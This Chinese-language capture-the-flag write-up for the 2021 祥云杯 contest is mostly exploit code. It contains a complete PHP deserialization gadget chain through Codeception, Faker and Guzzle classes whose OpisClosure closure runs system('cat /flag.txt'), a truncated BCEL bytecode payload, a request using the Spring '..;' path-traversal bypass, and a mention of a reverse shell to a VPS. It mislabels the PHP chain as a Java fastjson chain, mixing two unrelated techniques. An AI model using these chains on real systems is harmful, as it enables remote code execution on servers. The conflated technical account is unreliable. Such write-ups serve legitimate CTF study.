---
title: 祥云杯-WriteUp
contest: 祥云杯
year: 2021
difficulty: hard
vuln_type: web_unknown
tags: [fastjson反序列化, BCEL字节码, Codeception RunProcess, Guzzle AppendStream, OpisClosure, 内网穿透, Spring路径穿越]
attack_chain: 内网fastjson反序列化→BCEL字节码执行→CodeceptionExtensionRunProcess链→GuzzleHttpPsr7AppendStream→CachingStream→PumpStream→OpisClosure序列化system('cat /flag.txt')→/admin/test路径穿越
key_payload: "$$BCEL$$字节码;CodeceptionExtensionRunProcess;GuzzleHttpPsr7AppendStream/CachingStream/PumpStream;OpisClosureserialize system('cat /flag.txt');fastjson反序列化;10.10.1.11:8080/xxxx/..;/admin/test"
one_liner: 祥云杯fastjson反序列化+BCEL字节码+Codeception/Guzzle/OpisClosure多链触发system
lesson: fastjson+BCEL+Spring路径穿越(..;)+Codeception/Guzzle/OpisClosure gadget链组合
quality: high
---

# 祥云杯-WriteUp

**赛事**：祥云杯（2021）

**性质**：内网fastjson反序列化 + Web路径穿越

**攻击链**：

**Step 1：环境**
- VPS 10.10.1.12 监听 9999 端口
- 目标 10.10.1.11:8080
- /xxxx/..;/admin/test 路径穿越

**Step 2：fastjson反序列化**
- Java 链：CodeceptionExtensionRunProcess + GuzzleHttpPsr7AppendStream + CachingStream + PumpStream

**Step 3：PHP利用链构造**：
```php
namespace CodeceptionExtension {
    use Faker\DefaultGenerator;
    use GuzzleHttp\Psr7\AppendStream;
    class RunProcess {
        protected $output;
        private $processes = [];
        public function __construct() {
            $this->processes[] = new DefaultGenerator(new AppendStream());
            $this->output = new DefaultGenerator('jiang');
        }
    }
    echo base64_encode(serialize(new RunProcess()));
}

namespace Faker {
    class DefaultGenerator {
        protected $default;
        public function __construct($default = null) {
            $this->default = $default;
        }
    }
}

namespace GuzzleHttp\Psr7 {
    use Faker\DefaultGenerator;
    final class AppendStream {
        private $streams = [];
        private $seekable = true;
        public function __construct() {
            $this->streams[] = new CachingStream();
        }
    }
    final class CachingStream {
        private $remoteStream;
        public function __construct() {
            $this->remoteStream = new DefaultGenerator(false);
            $this->stream = new PumpStream();
        }
    }
    final class PumpStream {
        private $source;
        private $size = -10;
        private $buffer;
        public function __construct() {
            $this->buffer = new DefaultGenerator('j');
            include("closure/autoload.php");
            $a = function() { system('cat /flag.txt'); };
            $a = OpisClosure\serialize($a);
            $b = unserialize($a);
            $this->source = $b;
        }
    }
}
```

**Step 4：BCEL字节码执行**：
```python
bcel = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeRMo$d3$40$Q$7d$eb$d8$b1c$5c$d2$ba$94$8fBK$gHq$5c$88$v$aa$90h$x$$$I$$M$B$e1$K$Uq$e9z$bb$a4$$$89c9$9b$d2$D$ff$87sA$C$84$E$3f$80$l$85$98$b5P$L$d4$b6..."
```

**Step 5：HTTP请求**：
```python
burp0_url = "http://10.10.1.11:8080/xxxx/..;/admin/test"
burp0_headers = {
    "Cache-Control": "max-age=0", "DNT": "1",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 ...",
    "Accept": "application/json",
    "Content-Type": "application/json"
}
```

**核心技术**：
- fastjson反序列化触发
- BCEL字节码注入（`$$BCEL$$...`）
- Codeception RunProcess 链
- Guzzle AppendStream 链
- OpisClosure 序列化 + 闭包RCE
- Spring 路径穿越 `..;`
- 内网监听 9999 端口反弹shell

**质量评估**：高（完整利用链 + 4个命名空间 + BCEL字节码）
